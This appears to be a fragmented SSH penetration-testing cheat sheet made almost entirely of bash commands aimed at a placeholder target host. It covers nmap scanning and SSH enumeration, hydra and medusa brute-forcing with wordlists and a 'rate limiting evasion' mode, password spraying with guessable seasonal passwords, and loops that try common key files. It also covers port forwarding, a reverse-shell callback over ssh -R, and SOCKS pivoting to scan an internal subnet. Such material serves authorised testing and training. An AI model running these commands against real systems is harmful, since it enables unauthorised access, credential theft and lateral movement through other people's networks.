...
```bash
# Quick SSH port scan
nmap -p 22 ${REMOTE_NODE_IP}/24 --open

# Common alternate SSH ports
nmap -p 22,2222,22222,2200 ${REMOTE_NODE_IP}

# Full port scan for SSH
nmap -p- --open ${REMOTE_NODE_IP} | grep -i ssh

# Service version detection
nmap -sV -p 22 ${REMOTE_NODE_IP}
```
...
```bash
# Banner grabbing
nc ${REMOTE_NODE_IP} 22
# Output: SSH-2.0-OpenSSH_8.4p1 Debian-5

# Telnet banner grab
telnet ${REMOTE_NODE_IP} 22

# Nmap version detection with scripts
nmap -sV -p 22 --script ssh-hostkey ${REMOTE_NODE_IP}

# Enumerate supported algorithms
nmap -p 22 --script ssh2-enum-algos ${REMOTE_NODE_IP}

# Get host keys
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full ${REMOTE_NODE_IP}

# Check authentication methods
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" ${REMOTE_NODE_IP}
```
...
ssh-audit ${REMOTE_NODE_IP}

# ssh-audit with specific port
ssh-audit -p 2222 ${REMOTE_NODE_IP}
...
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://${REMOTE_NODE_IP}

# Username list, single password
hydra -L users.txt -p Password123 ssh://${REMOTE_NODE_IP}

# Username and password lists
hydra -L users.txt -P passwords.txt ssh://${REMOTE_NODE_IP}

# With specific port
hydra -l admin -P passwords.txt -s 2222 ssh://${REMOTE_NODE_IP}

# Rate limiting evasion (slow)
hydra -l admin -P passwords.txt -t 1 -w 5 ssh://${REMOTE_NODE_IP}

# Verbose output
hydra -l admin -P passwords.txt -vV ssh://${REMOTE_NODE_IP}

# Exit on first success
hydra -l admin -P passwords.txt -f ssh://${REMOTE_NODE_IP}
```
...
```bash
# Basic brute-force
medusa -h ${REMOTE_NODE_IP} -u admin -P passwords.txt -M ssh

# Multiple targets
medusa -H targets.txt -u admin -P passwords.txt -M ssh

# With username list
medusa -h ${REMOTE_NODE_IP} -U users.txt -P passwords.txt -M ssh

# Specific port
medusa -h ${REMOTE_NODE_IP} -u admin -P passwords.txt -M ssh -n 2222
```
...
hydra -L users.txt -p Summer2024! ssh://${REMOTE_NODE_IP}

# Multiple common passwords
for pass in "Password123" "Welcome1" "Summer2024!"; do
    hydra -L users.txt -p "$pass" ssh://${REMOTE_NODE_IP}
done
```
...
ssh -i id_rsa user@${REMOTE_NODE_IP}

# Specify key explicitly (bypass agent)
ssh -o IdentitiesOnly=yes -i id_rsa user@${REMOTE_NODE_IP}

# Force password authentication
ssh -o PreferredAuthentications=password user@${REMOTE_NODE_IP}

# Try common key names
for key in id_rsa id_dsa id_ecdsa id_ed25519; do
    ssh -i "$key" user@${REMOTE_NODE_IP}
done
```
...
ssh -L 8080:${REMOTE_NODE_IP}:80 user@${REMOTE_NODE_IP}
# Now access http://localhost:8080

# Access internal database
ssh -L 3306:${REMOTE_NODE_IP}:3306 user@${REMOTE_NODE_IP}

# Multiple forwards
ssh -L 8080:${REMOTE_NODE_IP}:80 -L 3306:${REMOTE_NODE_IP}:3306 user@${REMOTE_NODE_IP}
```
...
ssh -R 8080:localhost:80 user@${REMOTE_NODE_IP}
# Remote can access via localhost:8080

# Reverse shell callback
ssh -R 4444:localhost:4444 user@${REMOTE_NODE_IP}
```
...
ssh -D 1080 user@${REMOTE_NODE_IP}

# Use with proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT -Pn ${REMOTE_NODE_IP}/24
